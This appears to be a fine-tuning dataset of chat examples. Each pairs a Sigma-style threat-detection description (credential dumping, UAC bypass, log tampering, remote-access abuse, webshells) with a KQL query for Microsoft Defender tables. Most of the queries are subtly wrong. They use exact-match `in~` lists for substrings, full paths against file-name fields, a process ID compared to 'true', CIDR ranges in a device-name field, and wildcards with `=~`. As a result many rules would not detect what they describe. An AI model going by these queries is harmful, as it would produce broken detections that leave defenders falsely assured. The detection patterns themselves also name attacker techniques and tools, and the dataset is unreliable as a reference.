{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Get-Variable is a valid PowerShell cmdlet\nWindowsApps is by default in the path where PowerShell is executed.\nSo when the Get-Variable command is issued on PowerShell execution, the system first looks for the Get-Variable executable in the path and executes the malicious binary instead of looking for the PowerShell cmdlet.\n Topic: file_event_win_susp_get_variable"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"Local\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a Word document via the WinWord Start Menu shortcut.\nThis behavior was observed being used by KamiKakaBot samples in order to initiate the 2nd stage of the infection.\n Topic: proc_creation_win_malware_kamikakabot_lnk_lure_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \".doc\" and (ProcessCommandLine in~ (\"/c \", \".lnk ~\", \"Start Menu\\\\Programs\\\\Word\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables Topic: proc_creation_win_susp_script_exec_from_env_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -ep bypass \", \" -ExecutionPolicy bypass \", \" -w hidden \", \"/e:javascript \", \"/e:Jscript \", \"/e:vbscript \")) or (InitiatingProcessFolderPath in~ (\"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\wscript.exe\")) or (ProcessVersionInfoOriginalFileName in~ (\"cscript.exe\", \"mshta.exe\", \"wscript.exe\"))) and ((ProcessCommandLine in~ (\":\\\\Perflogs\\\\\", \":\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\", \"\\\\AppData\\\\Roaming\\\\Temp\", \"\\\\Temporary Internet\", \"\\\\Windows\\\\Temp\")) or ((ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favorites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favourites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Contacts\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39) Topic: file_event_win_uac_bypass_dotnet_profiler"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\pe386.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files that indicator an interactive use of PowerShell in the SYSTEM user context Topic: file_event_win_susp_system_interactive_powershell"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\", \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\PowerShell\\\\StartupProfileData-Interactive\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Potential adversaries accessing the microphone and webcam in an endpoint. Topic: win_security_camera_microphone_access"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\microphone\\\\NonPackaged\" or RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\webcam\\\\NonPackaged\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects events with patterns found in commands used for reconnaissance on linux systems Topic: proc_creation_lnx_susp_recon_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" -name .htpasswd\", \" -perm -4000 \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n Topic: proc_creation_win_msiexec_execute_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -y\" or ProcessCommandLine contains \" /y\" or ProcessCommandLine contains \" \u2013y\" or ProcessCommandLine contains \" \u2014y\" or ProcessCommandLine contains \" \u2015y\") and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\") and (not((ProcessCommandLine in~ (\"\\\\MsiExec.exe\\\" /Y \\\"C:\\\\Program Files\\\\Bonjour\\\\mdnsNSP.dll\", \"\\\\MsiExec.exe\\\" /Y \\\"C:\\\\Program Files (x86)\\\\Bonjour\\\\mdnsNSP.dll\", \"\\\\MsiExec.exe\\\" /Y \\\"C:\\\\Program Files (x86)\\\\Apple Software Update\\\\ScriptingObjectModel.dll\", \"\\\\MsiExec.exe\\\" /Y \\\"C:\\\\Program Files (x86)\\\\Apple Software Update\\\\SoftwareUpdateAdmin.dll\", \"\\\\MsiExec.exe\\\" /Y \\\"C:\\\\Windows\\\\CCM\\\\\", \"\\\\MsiExec.exe\\\" /Y C:\\\\Windows\\\\CCM\\\\\", \"\\\\MsiExec.exe\\\" -Y \\\"C:\\\\Program Files\\\\Bonjour\\\\mdnsNSP.dll\", \"\\\\MsiExec.exe\\\" -Y \\\"C:\\\\Program Files (x86)\\\\Bonjour\\\\mdnsNSP.dll\", \"\\\\MsiExec.exe\\\" -Y \\\"C:\\\\Program Files (x86)\\\\Apple Software Update\\\\ScriptingObjectModel.dll\", \"\\\\MsiExec.exe\\\" -Y \\\"C:\\\\Program Files (x86)\\\\Apple Software Update\\\\SoftwareUpdateAdmin.dll\", \"\\\\MsiExec.exe\\\" -Y \\\"C:\\\\Windows\\\\CCM\\\\\", \"\\\\MsiExec.exe\\\" -Y C:\\\\Windows\\\\CCM\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"curl.exe\" with the \"insecure\" flag over proxy or DOH. Topic: proc_creation_win_curl_insecure_porxy_or_doh"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--doh-insecure\", \"--proxy-insecure\")) and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc) Topic: proc_creation_win_pua_wsudo_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-u System\", \"-uSystem\", \"-u TrustedInstaller\", \"-uTrustedInstaller\", \" --ti \")) or (FolderPath endswith \"\\\\wsudo.exe\" or ProcessVersionInfoOriginalFileName =~ \"wsudo.exe\" or ProcessVersionInfoFileDescription =~ \"Windows sudo utility\" or InitiatingProcessFolderPath endswith \"\\\\wsudo-bridge.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors Topic: proc_creation_win_lolbin_susp_grpconv"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"grpconv.exe -o\", \"grpconv -o\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects persistence via Visual Studio Tools for Office (VSTO) add-ins in Office applications. Topic: registry_set_persistence_office_vsto"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Office\\\\Outlook\\\\Addins*\" or RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Office\\\\Word\\\\Addins*\" or RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Office\\\\Excel\\\\Addins*\" or RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Office\\\\Powerpoint\\\\Addins*\" or RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\VSTO\\\\Security\\\\Inclusion*\") and (not(((InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\AVG\\\\Antivirus\\\\RegSvr.exe\" and RegistryKey endswith \"\\\\Microsoft\\\\Office\\\\Outlook\\\\Addins\\\\Antivirus.AsOutExt*\") or (InitiatingProcessFolderPath in~ (\"\\\\msiexec.exe\", \"\\\\regsvr32.exe\")) or (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\integrator.exe\", \"\\\\OfficeClickToRun.exe\", \"\\\\winword.exe\", \"\\\\visio.exe\")) or InitiatingProcessFolderPath =~ \"\\\\Teams.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe Topic: proc_creation_win_cmd_ntdllpipe_redirect"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"type %windir%\\\\system32\\\\ntdll.dll\", \"type %systemroot%\\\\system32\\\\ntdll.dll\", \"type c:\\\\windows\\\\system32\\\\ntdll.dll\", \"\\\\ntdll.dll > \\\\\\\\.\\\\pipe\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n Topic: proc_creation_lnx_clipboard_collection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"xclip\" and (ProcessCommandLine in~ (\"-sel\", \"clip\", \"-o\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords Topic: proc_creation_win_iis_appcmd_service_account_password_dumped"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"list \" and (FolderPath endswith \"\\\\appcmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"appcmd.exe\")) and ((ProcessCommandLine in~ (\" /config\", \" /xml\", \" -config\", \" -xml\")) or ((ProcessCommandLine in~ (\" /@t\", \" /text\", \" /show\", \" -@t\", \" -text\", \" -show\")) and (ProcessCommandLine in~ (\":*\", \"password\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a copy command or a copy utility execution to or from an Admin share or remote Topic: proc_creation_win_susp_copy_lateral_movement"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\Sysvol\\\\\") or (ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \"$\")) and (((FolderPath endswith \"\\\\robocopy.exe\" or FolderPath endswith \"\\\\xcopy.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"robocopy.exe\", \"XCOPY.EXE\"))) or (ProcessCommandLine =~ \"copy\" and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")) or ((ProcessCommandLine in~ (\"copy-item\", \"copy \", \"cpi \", \" cp \", \"move \", \"move-item\", \" mi \", \" mv \")) and ((FolderPath contains \"\\\\powershell.exe\" or FolderPath contains \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of LiveKD based on PE metadata or image name Topic: proc_creation_win_sysinternals_livekd_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\livekd.exe\" or FolderPath endswith \"\\\\livekd64.exe\") or ProcessVersionInfoOriginalFileName =~ \"livekd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a CodePage modification using the \"mode.com\" utility to Russian language.\nThis behavior has been used by threat actors behind Dharma ransomware.\n Topic: proc_creation_win_mode_codepage_russian"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine endswith \"=1251\" or ProcessCommandLine endswith \"=866\") and (ProcessCommandLine in~ (\" con \", \" cp \", \" select=\"))) and (FolderPath endswith \"\\\\mode.com\" or ProcessVersionInfoOriginalFileName =~ \"MODE.COM\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\n Topic: proc_creation_win_cmd_dir_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\") and (ProcessCommandLine =~ \"*dir*-s*\" or ProcessCommandLine =~ \"*dir*/s*\" or ProcessCommandLine =~ \"*dir*\u2013s*\" or ProcessCommandLine =~ \"*dir*\u2014s*\" or ProcessCommandLine =~ \"*dir*\u2015s*\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious use of XORDump process memory dumping utility Topic: proc_creation_win_hktl_xordump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\xordump.exe\" or (ProcessCommandLine contains \" -process lsass.exe \" or ProcessCommandLine contains \" -m comsvcs \" or ProcessCommandLine contains \" -m dbghelp \" or ProcessCommandLine contains \" -m dbgcore \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule Topic: proc_creation_win_netsh_port_forwarding"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\") and ((ProcessCommandLine in~ (\"interface\", \"portproxy\", \"add\", \"v4tov4\")) or (ProcessCommandLine in~ (\"i \", \"p \", \"a \", \"v \")) or (ProcessCommandLine in~ (\"connectp\", \"listena\", \"c=\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects abusing Windows 10 Narrators Feedback-Hub Topic: registry_event_narrator_feedback_persistance"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"DeleteValue\" and RegistryKey endswith \"\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\Shell\\\\open\\\\command\\\\DelegateExecute\") or RegistryKey endswith \"\\\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\\\Shell\\\\open\\\\command\\\\(Default)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow Topic: proc_creation_win_werfault_reflect_debugger_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -pr \" and (FolderPath endswith \"\\\\WerFault.exe\" or ProcessVersionInfoOriginalFileName =~ \"WerFault.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with EventLog service \"file\" key. In order to change the default location of an Evtx file. This technique is used to tamper with log collection and alerting Topic: registry_set_evtx_file_key_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\EventLog*\" and RegistryKey endswith \"\\\\File\") and (not(RegistryValueData contains \"\\\\System32\\\\Winevt\\\\Logs\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Dllhost.EXE initiating a network connection to a non-local IP address.\nAside from Microsoft own IP range that needs to be excluded. Network communication from Dllhost will depend entirely on the hosted DLL.\nAn initial baseline is recommended before deployment.\n Topic: net_connection_win_dllhost_non_local_ip"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\dllhost.exe\") and (not(((InitiatingProcessRemoteSessionDeviceName in~ (\"::1/128\", \"10.0.0.0/8\", \"127.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"fc00::/7\", \"fe80::/10\")) or (InitiatingProcessRemoteSessionDeviceName in~ (\"20.184.0.0/13\", \"20.192.0.0/10\", \"23.72.0.0/13\", \"51.10.0.0/15\", \"51.103.0.0/16\", \"51.104.0.0/15\", \"52.224.0.0/11\", \"150.171.0.0/19\", \"204.79.197.0/24\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects applications or users re-enabling old TLS versions by setting the \"Enabled\" value to \"1\" for the \"Protocols\" registry key. Topic: registry_set_tls_protocol_old_version_enabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.0*\" or RegistryKey endswith \"\\\\Control\\\\SecurityProviders\\\\SCHANNEL\\\\Protocols\\\\TLS 1.1*\") and RegistryKey endswith \"\\\\Enabled\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "TeamViewer_Desktop.exe is create during install Topic: file_event_win_install_teamviewer_desktop"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\TeamViewer_Desktop.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of tomcat WebServer logs which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_tomcat_logs"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"catalina.\", \"_access_log.\", \"localhost.\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects any child process spawning from \"Diskshadow.exe\". This could be due to executing Diskshadow in interpreter mode or script mode and using the \"exec\" flag to launch other applications. Topic: proc_creation_win_diskshadow_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\diskshadow.exe\" and (not(InitiatingProcessFolderPath =~ \":\\\\Windows\\\\System32\\\\WerFault.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of ntdsutil.exe to perform different actions such as restoring snapshots...etc. Topic: proc_creation_win_ntdsutil_susp_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\ntdsutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"ntdsutil.exe\") and ((ProcessCommandLine contains \"snapshot\" and ProcessCommandLine contains \"mount \") or (ProcessCommandLine contains \"ac\" and ProcessCommandLine contains \" i\" and ProcessCommandLine contains \" ntds\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"system_profiler\" with specific \"Data Types\" that have been seen being used by threat actors and malware. It provides system hardware and software configuration information.\nThis process is primarily used for system information discovery. However, \"system_profiler\" can also be used to determine if virtualization software is being run for defense evasion purposes.\n Topic: proc_creation_macos_system_profiler_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"SPApplicationsDataType\", \"SPHardwareDataType\", \"SPNetworkDataType\", \"SPUSBDataType\")) and (FolderPath endswith \"/system_profiler\" or ProcessCommandLine contains \"system_profiler\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects ScreenConnect program starts that establish a remote access to a system. Topic: proc_creation_win_remote_access_tools_screenconnect_installation_cli_param"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"e=Access&\", \"y=Guest&\", \"&p=\", \"&c=\", \"&k=\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of WebDAV temporary files with potentially suspicious extensions Topic: file_event_win_webdav_tmpfile_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".7z\", \".bat\", \".dat\", \".ico\", \".js\", \".lnk\", \".ps1\", \".rar\", \".vbe\", \".vbs\", \".zip\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the event log files which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_event_log_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".evtx\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_netsupport"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"NetSupport Client Configurator\" or ProcessVersionInfoProductName =~ \"NetSupport Remote Control\" or ProcessVersionInfoCompanyName =~ \"NetSupport Ltd\" or ProcessVersionInfoOriginalFileName =~ \"PCICFGUI.EXE\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious sub processes of web server processes Topic: proc_creation_lnx_webshell_detection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"/httpd\", \"/lighttpd\", \"/nginx\", \"/apache2\", \"/node\", \"/caddy\")) or (InitiatingProcessCommandLine in~ (\"/bin/java\", \"tomcat\")) or (InitiatingProcessCommandLine in~ (\"/bin/java\", \"websphere\"))) and (InitiatingProcessFolderPath in~ (\"/whoami\", \"/ifconfig\", \"/ip\", \"/bin/uname\", \"/bin/cat\", \"/bin/crontab\", \"/hostname\", \"/iptables\", \"/netstat\", \"/pwd\", \"/route\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process execution patterns related to Griffon malware as reported by Kaspersky Topic: proc_creation_win_malware_griffon_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\local\\\\temp\\\\\", \"//b /e:jscript\", \".txt\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects javaw.exe in AppData folder as used by Adwind / JRAT Topic: proc_creation_win_malware_adwind"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"\\\\AppData\\\\Roaming\\\\Oracle\" and ProcessCommandLine contains \"\\\\java\" and ProcessCommandLine contains \".exe \") or (ProcessCommandLine contains \"cscript.exe\" and ProcessCommandLine contains \"Retrive\" and ProcessCommandLine contains \".vbs \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects AnyDesk writing binary files to disk other than \"gcapi.dll\".\nAccording to RedCanary research it is highly abnormal for AnyDesk to write executable files to disk besides gcapi.dll,\nwhich is a legitimate DLL that is part of the Google Chrome web browser used to interact with the Google Cloud API. (See reference section for more details)\n Topic: file_event_win_anydesk_writing_susp_binaries"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName in~ (\".dll\", \".exe\")) and InitiatingProcessFolderPath =~ \"\\\\anydesk.exe\") and (not(FileName =~ \"\\\\gcapi.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection Topic: proc_creation_win_susp_ntfs_short_name_use_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"~1.exe\", \"~1.bat\", \"~1.msi\", \"~1.vbe\", \"~1.vbs\", \"~1.dll\", \"~1.ps1\", \"~1.js\", \"~1.hta\", \"~2.exe\", \"~2.bat\", \"~2.msi\", \"~2.vbe\", \"~2.vbs\", \"~2.dll\", \"~2.ps1\", \"~2.js\", \"~2.hta\")) and (not(((InitiatingProcessFolderPath endswith \"\\\\WebEx\\\\WebexHost.exe\" or InitiatingProcessFolderPath endswith \"\\\\thor\\\\thor64.exe\") or ProcessCommandLine contains \"C:\\\\xampp\\\\vcredist\\\\VCREDI~1.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the BCP utility in order to export data from the database.\nAttackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file.\n Topic: proc_creation_win_bcp_export_data"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" out \", \" queryout \")) and (FolderPath endswith \"\\\\bcp.exe\" or ProcessVersionInfoOriginalFileName =~ \"BCP.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_gotoopener"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"GoTo Opener\" or ProcessVersionInfoProductName =~ \"GoTo Opener\" or ProcessVersionInfoCompanyName =~ \"LogMeIn, Inc.\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the Windows Update Client binary (wuauclt.exe) for proxy execution. Topic: proc_creation_win_wuauclt_dll_loading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"UpdateDeploymentProvider\", \"RunHandlerComServer\")) and (FolderPath endswith \"\\\\wuauclt.exe\" or ProcessVersionInfoOriginalFileName =~ \"wuauclt.exe\")) and (not((ProcessCommandLine =~ \" /UpdateDeploymentProvider UpdateDeploymentProvider.dll \" or (ProcessCommandLine in~ (\":\\\\Windows\\\\UUS\\\\Packages\\\\Preview\\\\amd64\\\\updatedeploy.dll /ClassId\", \":\\\\Windows\\\\UUS\\\\amd64\\\\UpdateDeploy.dll /ClassId\")) or (ProcessCommandLine in~ (\":\\\\Windows\\\\WinSxS\\\\\", \"\\\\UpdateDeploy.dll /ClassId \")) or ProcessCommandLine =~ \" wuaueng.dll \")))"}]}
